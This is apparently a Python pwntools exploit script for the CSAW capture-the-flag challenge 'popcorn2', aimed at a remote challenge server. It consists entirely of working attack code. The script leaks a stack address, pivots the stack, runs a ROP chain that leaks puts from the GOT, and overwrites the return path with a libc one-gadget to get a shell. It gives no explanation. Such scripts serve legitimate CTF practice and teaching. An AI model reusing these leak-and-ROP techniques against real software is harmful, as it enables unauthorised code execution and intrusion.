\from pwn import *
import base64
p = remote('pwn.chal.csaw.io', 1004)
#p = process('./popcorn2')
#gdb.attach(p)
e =  ELF('./popcorn2')
l =  ELF('./libc.so.6')
print p.recv(1024)
p.sendline('a'*127) #leaks stack address
print p.recv(127)
x = p.recv(8)
cat= ''
for i in bytearray(x)[::-1]:
	if i =="0xa":continue
	print hex(i)
	cat+=(hex(i)[2:])
y = int("0x"+cat[1:13],16)-184
print "y: " + hex(y) #parse stack address
payload = "A"*136
payload +=p64(e.symbols['main'])
p.sendline(payload)
p.recv()
payload2 =  p64(y)
payload2 += p64(0x40123b) # pop rdi; ret
payload2 += p64(e.got['puts'])
payload2 += p64(e.plt['puts'])
payload2 += p64(e.symbols['main'])
payload2 += '\x00'*(104-16)
payload2 += p64(y)
payload2 += p64(0x401182)  #leave ; ret
#payload2 += p64(0x401129) #pop rbp ; ret
#payload2 += p64(y)	  #address of stack where rdi gadget lay
p.recv(1024)
p.sendline(payload2)
x2 = p.recv()[6:14]
cat = ''
print "X2 : " + x2
for i in bytearray(x2)[::-1]:
	if i =="0xa":continue
	print hex(i)
	cat+=(hex(i)[2:])
y2 = int(raw_input(),16)
print "y: " + hex(y2) #parse stack address
y2 = y2-0x71910+0x448a3
payload3 = p64(y2)*18
print payload3
p.sendline(payload3)
p.interactive()
